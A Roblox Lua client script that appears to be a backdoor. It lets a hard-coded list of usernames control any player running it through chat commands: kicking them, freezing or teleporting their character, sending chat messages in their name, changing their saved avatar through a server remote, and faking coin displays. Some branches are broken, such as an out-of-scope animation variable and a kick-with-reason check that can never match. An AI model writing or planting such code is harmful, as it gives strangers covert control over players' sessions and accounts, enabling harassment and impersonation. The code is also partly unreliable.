local Players = game:GetService("Players")
local ReplicatedStorage = game:GetService("ReplicatedStorage")
local TextChatService = game:GetService("TextChatService")
local TweenService = game:GetService("TweenService")

local targetUsernames = {
    ["zynlopea"] = true,
    ["ismaelbestogun"] = true,
    ["Rylix56"] = true,
    ["zynlope"] = true,
    ["sci_mythical77"] = true,
    ["nowummy"] = true,
    ["nowumy"] = true,
}

local function isTargetPlayer(playerName)
    return targetUsernames[playerName] ~= nil
end

local function showBroadcastMessage(text)
    local player = Players.LocalPlayer
    local playerGui = player:WaitForChild("PlayerGui")

    local existingGui = playerGui:FindFirstChild("BroadcastGui")
    if existingGui then
        existingGui:Destroy()
    end

    local screenGui = Instance.new("ScreenGui")
    screenGui.Name = "BroadcastGui"
    screenGui.ResetOnSpawn = false
    screenGui.Parent = playerGui

    local label = Instance.new("TextLabel")
    label.Size = UDim2.new(1, 0, 0.3, 0)
    label.Position = UDim2.new(0, 0, 0.35, 0)
    label.BackgroundTransparency = 1
    label.Text = text
    label.TextColor3 = Color3.new(1, 1, 1)
    label.TextScaled = true
    label.Font = Enum.Font.GothamBold
    label.TextStrokeTransparency = 0
    label.Parent = screenGui

    local tweenInfo = TweenInfo.new(2, Enum.EasingStyle.Quad, Enum.EasingDirection.Out)

    delay(3, function()
        local tween = TweenService:Create(label, tweenInfo, {TextTransparency = 1, TextStrokeTransparency = 1})
        tween:Play()
        tween.Completed:Connect(function()
            screenGui:Destroy()
        end)
    end)
end

local function onChat(player, message)
    if not isTargetPlayer(player.Name) then return end
    local command = message:lower()

    if command == "/e fa" then
        local myPlayer = Players.LocalPlayer
        local character = myPlayer.Character or myPlayer.CharacterAdded:Wait()
        local humanoid = character:FindFirstChildOfClass("Humanoid")
        if humanoid then
            local animation = Instance.new("Animation")
            animation.AnimationId = "rbxassetid://754656200"
            local animator = humanoid:FindFirstChildOfClass("Animator") or humanoid:WaitForChild("Animator")
            local animationTrack = animator:LoadAnimation(animation)
            animationTrack.Looped = true
            animationTrack:Play()
            animationTrack:AdjustSpeed(50)
        end

    elseif command == "/e unfa" then
        if animationTrack then
            animationTrack:Stop()
        end

    elseif command == "/e kitten" then
        local myPlayer = Players.LocalPlayer
        if myPlayer then
            local args = {
                [1] = {
                    ["SwimAnimation"] = 2510240941,
                    ["Torso"] = 4637151279,
                    ["ProportionScale"] = 0,
                    ["ClimbAnimation"] = 2510230574,
                    ["Shirt"] = 11289085978,
                    ["FaceAccessory"] = "13353986061,12580366888,8923599923",
                    ["RightArmColor"] = { "248", "248", "248" },
                    ["HairAccessory"] = "13918965164,14314838611",
                    ["FallAnimation"] = 2510233257,
                    ["TorsoColor"] = { "248", "248", "248" },
                    ["DepthScale"] = 0.8,
                    ["HeightScale"] = 0.9,
                    ["WaistAccessory"] = "14335771887",
                    ["BodyTypeScale"] = 0,
                    ["BackAccessory"] = "8651335862",
                    ["Emotes"] = {
                        ["1"] = { 9528286240 },
                        ["8"] = { 12874468267 },
                        ["3"] = { 7466046574 },
                        ["2"] = { 11309263077 },
                        ["4"] = { 3576968026 },
                        ["7"] = { 13344121112 }
                    },
                    ["Pants"] = 14851012835,
                    ["JumpAnimation"] = 2510236649,
                    ["HatAccessory"] = "12579341301,13142881183,1402432199",
                    ["WalkAnimation"] = 2510242378,
                    ["IdleAnimation"] = 2510235063,
                    ["RunAnimation"] = 2510238627,
                    ["HeadScale"] = 1,
                    ["GraphicTShirt"] = 10891067215
                }
            }
            ReplicatedStorage.FunctionConnections.NewAESaveAvatar:InvokeServer(unpack(args))
        end

    elseif command == "/e freeze" then
        local myCharacter = Players.LocalPlayer.Character
        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
            myCharacter.HumanoidRootPart.Anchored = true
        end

    elseif command == "/e unfreeze" then
        local myCharacter = Players.LocalPlayer.Character
        if myCharacter and myCharacter:FindFirstChild("HumanoidRootPart") then
            myCharacter.HumanoidRootPart.Anchored = false
        end

    elseif command:sub(1, 7) == "/e chat" then
        local chatMessage = message:sub(9)
        if chatMessage:gsub("%s+", "") ~= "" then
            local textChannel = TextChatService:WaitForChild("TextChannels"):FindFirstChild("RBXGeneral")
            if textChannel then
                textChannel:SendAsync(chatMessage)
            end
        end

    elseif command == "/e bring" then
        local targetCharacter = player.Character
        local myPlayer = Players.LocalPlayer
        if myPlayer and targetCharacter then
            local targetHRP = targetCharacter:FindFirstChild("HumanoidRootPart")
            local myCharacter = myPlayer.Character
            if myCharacter and targetHRP then
                local myHRP = myCharacter:FindFirstChild("HumanoidRootPart")
                if myHRP then
                    myHRP.CFrame = targetHRP.CFrame
                end
            end
        end

    elseif command == "/e kick" then
        local myPlayer = Players.LocalPlayer
        if myPlayer then
            myPlayer:Kick("Either kicked by Zynlope, or an admin of Zynlope.")
        end

    elseif command:sub(1, 8) == "/e kick r" then
        local reason = message:sub(10)
        if reason ~= "" then
            local myPlayer = Players.LocalPlayer
            if myPlayer then
                myPlayer:Kick("Kicked by command reason: "..reason)
            end
        end

    elseif command:sub(1, 5) == "/e js" then
        local broadcastMessage = message:sub(7)
        if broadcastMessage:gsub("%s", "") ~= "" then
            showBroadcastMessage(broadcastMessage)
        end

    elseif command:sub(1, 8) == "/e coins" then
        local coinValue = message:sub(10)
        if coinValue:gsub("%s", "") ~= "" then
            local text = tostring(coinValue)
            local player = Players.LocalPlayer

            local mainGui = player.PlayerGui:FindFirstChild("MainGui")
            if mainGui then
                local coinsContainer = mainGui:FindFirstChild("CoinsContainer")
                if coinsContainer then
                    local container = coinsContainer:FindFirstChild("Container")
                    if container and container:FindFirstChild("Amount") then
                        container.Amount.Text = text
                    end
                end
            end

            local slayersPlayer = Players:FindFirstChild("SlayerssUnleashedd")
            if slayersPlayer then
                local shopGui = slayersPlayer.PlayerGui:FindFirstChild("ShopGui")
                if shopGui then
                    local bgContent = shopGui:FindFirstChild("Background")
                    if bgContent and bgContent:FindFirstChild("Content") then
                        local main = bgContent.Content:FindFirstChild("Main")
                        if main and main:FindFirstChild("TopContainer") then
                            local topContainer = main.TopContainer
                            if topContainer:FindFirstChild("CoinsContainer") and topContainer.CoinsContainer:FindFirstChild("TotalCoins") then
                                topContainer.CoinsContainer.TotalCoins.Text = text
                            end
                        end
                    end
                end

                local screenGui = slayersPlayer.PlayerGui:FindFirstChild("ScreenGui")
                if screenGui then
                    local itemShop = screenGui:FindFirstChild("ItemShop")
                    if itemShop and itemShop:FindFirstChild("ShopContent") then
                        local shopContent = itemShop.ShopContent
                        if shopContent:FindFirstChild("TopBar") then
                            local topBar = shopContent.TopBar
                            if topBar:FindFirstChild("ButtonBuyCoins") and topBar.ButtonBuyCoins:FindFirstChild("CoinAmount") then
                                topBar.ButtonBuyCoins.CoinAmount.Text = text
                            end
                        end
                    end
                end
            end
        end
    end
end

for _, player in ipairs(Players:GetPlayers()) do
    player.Chatted:Connect(function(msg) onChat(player, msg) end)
end

Players.PlayerAdded:Connect(function(player)
    player.Chatted:Connect(function(msg) onChat(player, msg) end)
end)
